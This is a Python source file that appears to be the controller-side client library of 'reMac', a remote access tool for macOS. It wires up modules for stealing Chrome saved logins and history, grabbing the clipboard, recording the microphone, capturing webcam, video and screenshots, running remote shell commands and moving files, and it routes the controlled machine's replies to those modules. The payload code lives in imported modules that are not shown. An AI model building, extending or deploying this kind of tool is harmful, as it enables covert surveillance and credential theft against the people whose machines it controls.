import json
from apps.libs.reMac_libbase import reMac_libbase
from apps.client.modules.mod_client_clipboard import mod_client_clipboard
from apps.client.modules.mod_client_hello import mod_client_hello
from apps.client.modules.mod_client_recmic import mod_client_recmic
from apps.client.modules.mod_client_info import mod_client_info
from apps.client.modules.mod_client_chrome_login import mod_client_chrome_login
from apps.client.modules.mod_client_chrome_history import mod_client_chrome_history
from apps.client.modules.mod_client_module_help import mod_client_module_help
from apps.client.modules.mod_client_screenshot import mod_client_screenshot
from apps.client.modules.mod_client_webcam import mod_client_webcam
from apps.client.modules.mod_client_shellcmd import mod_client_shellcmd
from apps.client.modules.mod_client_download import mod_client_download
from apps.client.modules.mod_client_upload import mod_client_upload
from apps.client.modules.mod_client_help import mod_client_help
from apps.client.modules.mod_client_video import mod_client_video
from apps.client.modules.mod_client_system_profiler import mod_client_system_profiler
from apps.client.modules.mod_client_webload import mod_client_webload
from apps.client.modules.mod_client_webupload import mod_client_webupload
from apps.client.modules.mod_client_args import mod_client_args


class reMac_libclient(reMac_libbase):

    isShellCmdRunning = False

    reMacModules = [
        mod_client_hello(),
        mod_client_clipboard(),
        mod_client_recmic(),
        mod_client_module_help(),
        mod_client_info(),
        mod_client_chrome_login(),
        mod_client_chrome_history(),
        mod_client_screenshot(),
        mod_client_webcam(),
        mod_client_shellcmd(),
        mod_client_download(),
        mod_client_upload(),
        mod_client_video(),
        mod_client_help(),
        mod_client_system_profiler(),
        mod_client_webload(),
        mod_client_webupload(),
        mod_client_args()
    ]
    prg = None

    def __init__(self, selector, sock, addr, request, prg = None):
        reMac_libbase.__init__(self, selector, sock, addr)
        self.prg = prg
        self.request = request
        self._recv_buffer = b""
        self._send_buffer = b""
        self._request_queued = False
        self._jsonheader_len = None
        self.jsonheader = None
        self.response = None

    def try_process_respons(self, action, message):
        return self.reMacModules[action][0].run_mod(message)

    def _read(self):
        try:
            # Should be ready to read
            data = self.sock.recv(4096)
        except BlockingIOError:
            # Resource temporarily unavailable (errno EWOULDBLOCK)
            pass
        else:
            if data:
                self._recv_buffer += data
            else:
                raise RuntimeError("Peer closed.")

    def _write(self):
        if self._send_buffer:
            print("sending", repr(self._send_buffer), "to", self.addr)
            try:
                # Should be ready to write
                sent = self.sock.send(self._send_buffer)
            except BlockingIOError:
                # Resource temporarily unavailable (errno EWOULDBLOCK)
                pass
            else:
                self._send_buffer = self._send_buffer[sent:]

    def getModule4Cmd(self, cmd):
        args = cmd.split(" ", 1)
        for md in self.reMacModules:
            if md.cmd_short.startswith(args[0]) or md.cmd_long == args[0]:
                return md
        return None

    def _process_response_json_content(self):
        content = self.response
        result = content.get("result")
        action = content.get("action")

        # if self.isShellCmdRunning == True:
        mod = self.getModule4Cmd(action)
        if mod is not None:
            try:
                result = json.loads(result)
            except Exception:
                pass
            result = json.dumps(result, indent=4, sort_keys=True)
            print(f"got result: {result}, action: {action}")
            return mod.run_mod(content)
            # if action.startswith("mh"):
            #     for mod in self.reMacModules:
            #         if mod.cmd_short == "mh":
            #             return mod.run_mod(content)
            # elif action == "vd":
            #     for mod in self.reMacModules:
            #         if mod.cmd_short == "vd":
            #             return mod.run_mod(content)
            # elif action == "in" or action == "info":
            #     for mod in self.reMacModules:
            #         if mod.cmd_short == "in" or mod.cmd_long == "info":
            #             return mod.run_mod(content)
            #     # return self.reMacModules[action.split(" ")[0]][0].run_mod(content)
            # elif action.startswith("cb"):
            #     for mod in self.reMacModules:
            #         if mod.cmd_short == "cb":
            #             return mod.run_mod(content)
            #     # return self.reMacModules["cb"][0].run_mod(content)
            # elif action.startswith("sc"):
            #     for mod in self.reMacModules:
            #         if mod.cmd_short == "sc":
            #             return mod.run_mod(content)
            #     # return self.reMacModules["sc"][0].run_mod(content)
            # elif action.startswith("wc"):
            #     for mod in self.reMacModules:
            #         if mod.cmd_short == "wc":
            #             return mod.run_mod(content)
            #     # return self.reMacModules["wc"][0].run_mod(content)
            # elif action.startswith("rm"):
            #     for mod in self.reMacModules:
            #         if mod.cmd_short == "rm":
            #             return mod.run_mod(content)
            #     # return self.reMacModules["rm"][0].run_mod(content)
            # elif action.startswith("cl"):
            #     for mod in self.reMacModules:
            #         if mod.cmd_short == "cl":
            #             return mod.run_mod(content)
            #     # return self.reMacModules["cl"][0].run_mod(content)
            # elif action.startswith("ch"):
            #     for mod in self.reMacModules:
            #         if mod.cmd_short == "ch":
            #             return mod.run_mod(content)
            #     # return self.reMacModules["ch"][0].run_mod(content)
            # elif action.startswith("hw"):
            #     for mod in self.reMacModules:
            #         if mod.cmd_short == "hw":
            #             return mod.run_mod(content)
            #     # return self.reMacModules["hw"][0].run_mod(content)
            # elif action.startswith("sh"):
            #     # if(action == "sh"):
            #     #     self.isShellCmdRunning = True
            #     # else:
            #     #     self.isShellCmdRunning = False
            #         # if self.isShellCmdRunning == True:
            #     for mod in self.reMacModules:
            #         if mod.cmd_short == "sh":
            #             return mod.run_mod(content)
            #     # return self.reMacModules["sh"][0].run_mod(content)
            # elif action.startswith("dl"):
            #     for mod in self.reMacModules:
            #         if mod.cmd_short == "dl":
            #             return mod.run_mod(content)
            #     # return self.reMacModules["dl"][0].run_mod(content)
            # elif action.startswith("ul"):
            #     for mod in self.reMacModules:
            #         if mod.cmd_short == "ul":
            #             return mod.run_mod(content)
            #     # return self.reMacModules["ul"][0].run_mod(content)
            # elif action.startswith("hp") or action.startswith("help"):
            #     for mod in self.reMacModules:
            #         if mod.cmd_short == "hp" or mod.cmd_long == "help":
            #             return mod.run_mod(content)
            #     # return self.reMacModules["hp"][0].run_mod(content)
            # else:
            #     print(f"got result: {result}, action: {action}")

    def _process_response_binary_content(self):
        content = self.response
        print(f"got response: {repr(content)}")

    def read(self):
        self._read()

        if self._jsonheader_len is None:
            self.process_protoheader()

        if self._jsonheader_len is not None:
            if self.jsonheader is None:
                self.process_jsonheader()

        if self.jsonheader:
            if self.response is None:
                self.process_response()

    def write(self):
        if not self._request_queued:
            self.queue_request()

        self._write()

        if self._request_queued:
            if not self._send_buffer:
                # Set selector to listen for read events, we're done writing.
                self._set_selector_events_mask("r")

    def queue_request(self):
        content = self.request["content"]
        content_type = self.request["type"]
        content_encoding = self.request["encoding"]
        if content_type == "text/json":
            req = {
                "content_bytes": self._json_encode(content, content_encoding),
                "content_type": content_type,
                "content_encoding": content_encoding,
            }
        else:
            req = {
                "content_bytes": content,
                "content_type": content_type,
                "content_encoding": content_encoding,
            }
        message = self._create_message(**req)
        self._send_buffer += message
        self._request_queued = True

    def process_response(self):
        content_len = self.jsonheader["content-length"]
        if not len(self._recv_buffer) >= content_len:
            return
        data = self._recv_buffer[:content_len]
        self._recv_buffer = self._recv_buffer[content_len:]
        if self.jsonheader["content-type"] == "text/json":
            encoding = self.jsonheader["content-encoding"]
            self.response = self._json_decode(data, encoding)
            print("received response", repr(self.response), "from", self.addr)
            self.prg.emit(self._process_response_json_content())
        else:
            # Binary or unknown content-type
            self.response = data
            print(
                f'received {self.jsonheader["content-type"]} response from',
                self.addr,
            )
            self._process_response_binary_content()
        # Close when response has been processed
        self.close()
